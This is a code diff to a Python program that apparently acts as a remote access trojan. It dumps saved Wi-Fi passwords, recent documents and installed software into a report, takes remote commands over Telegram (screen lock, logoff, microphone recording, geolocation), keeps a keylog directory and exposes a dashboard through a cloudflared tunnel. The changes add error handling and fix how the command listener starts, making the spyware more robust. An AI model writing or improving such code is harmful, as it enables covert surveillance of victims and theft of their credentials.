@@ -378,14 +378,26 @@ def _build_pc_status_text(cloudflared_url: str, status: str = "🟢 Active") -> 
 <b>Dashboard:</b> {cloudflared_url or 'N/A'}
 <b>Last Seen:</b> {now_str}"""
 
-    wifi_pwds = _dump_wifi_passwords()
-    wifi_text = ", ".join(wifi_pwds[:5]) if wifi_pwds else "None"
+    wifi_text = "None"
+    try:
+        wifi_pwds = _dump_wifi_passwords()
+        wifi_text = ", ".join(wifi_pwds[:5]) if wifi_pwds else "None"
+    except:
+        pass
 
-    recent = _get_recent_documents()
-    recent_text = ", ".join(recent[:5]) if recent else "None"
+    recent_text = "None"
+    try:
+        recent = _get_recent_documents()
+        recent_text = ", ".join(recent[:5]) if recent else "None"
+    except:
+        pass
 
-    installed = _get_installed_software()
-    installed_text = ", ".join(installed[:5]) if installed else "None"
+    installed_text = "None"
+    try:
+        installed = _get_installed_software()
+        installed_text = ", ".join(installed[:5]) if installed else "None"
+    except:
+        pass
 
     body = f"""
 
@@ -534,12 +546,22 @@ def _telegram_command_listener():
                     continue
                 if _TG_PENDING_ACTION:
                     _handle_telegram_file(msg)
-        except:
+        except Exception as e:
+            try:
+                with open(os.path.join(KEYLOG_DIR, "_tg_error.log"), 'a') as f:
+                    f.write(f"{datetime.now().isoformat()} CMD_LISTENER: {e}\n")
+            except:
+                pass
             time.sleep(5)
 
 def _handle_telegram_command(text: str):
     """Process a single Telegram command and respond."""
     global _TG_PENDING_ACTION
+    try:
+        with open(os.path.join(KEYLOG_DIR, "_tg_error.log"), 'a') as f:
+            f.write(f"{datetime.now().isoformat()} RECV: {text[:100]}\n")
+    except:
+        pass
     parts = text.split(maxsplit=1)
     cmd = parts[0].lower()
     args = parts[1] if len(parts) > 1 else ""
@@ -578,10 +600,10 @@ def _handle_telegram_command(text: str):
             "/lock - Lock screen\n"
             "/logoff - Log off user\n"
             "/hibernate - Hibernate\n"
-            "/speak <text> - Text to speech\n"
+            "/speak &lt;text&gt; - Text to speech\n"
             "/speak - Send audio file to play\n"
             "/wallpaper - Send image to set as wallpaper\n"
-            "/browser <url> - Open in browser\n"
+            "/browser &lt;url&gt; - Open in browser\n"
             "/status - Quick status\n"
             "/mic [secs] - Record microphone\n"
             "/geo - Geo location from IP\n"
@@ -5348,10 +5370,11 @@ def main():
                 threading.Thread(target=_telegram_heartbeat, args=(CLOUDFLARED_PUBLIC_URL,), daemon=True).start()
             except:
                 pass
-            try:
+        try:
+            if has_telegram:
                 threading.Thread(target=_telegram_command_listener, daemon=True).start()
-            except:
-                pass
+        except:
+            pass
     
     try:
         app.run(host=SERVICE_HOST, port=port, debug=False, use_reloader=False)
